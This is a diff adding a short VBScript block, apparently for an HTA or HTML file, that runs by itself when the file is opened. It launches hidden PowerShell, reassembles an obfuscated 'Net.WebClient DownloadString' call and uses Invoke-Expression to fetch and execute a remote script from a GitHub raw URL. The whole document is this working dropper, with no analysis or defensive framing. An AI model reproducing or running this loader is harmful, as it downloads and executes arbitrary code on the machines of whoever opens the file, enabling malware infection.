@@ -1,0 +1,9 @@
+<script language="VBScript">
+Function var_func()
+Dim var_shell
+set var_shell = CreateObject("Wscript.Shell")
+var_shell.run "powershell $BINGGOLIVE = '(Ne<<<<<<<<<<<<<<<>>>>>>>>>>>t.We'.Replace('<<<<<<<<<<<<<<<>>>>>>>>>>>','w-Object Ne'); $Facebook='bC!!!!!!!!!!!!@@@@@@@@@@@@@nlo'.Replace('!!!!!!!!!!!!@@@@@@@@@@@@@','lient).Dow'); $Skype='adString(''https://raw.githubusercontent.com/zxc4we009/Crrypt_2021/main/ALL.txt'')';$YOUTUBE=I`E`X ($BINGGOLIVE,$Facebook,$Skype -Join '')|I`E`X ",0
+End Function
+var_func
+self.close
+</script>
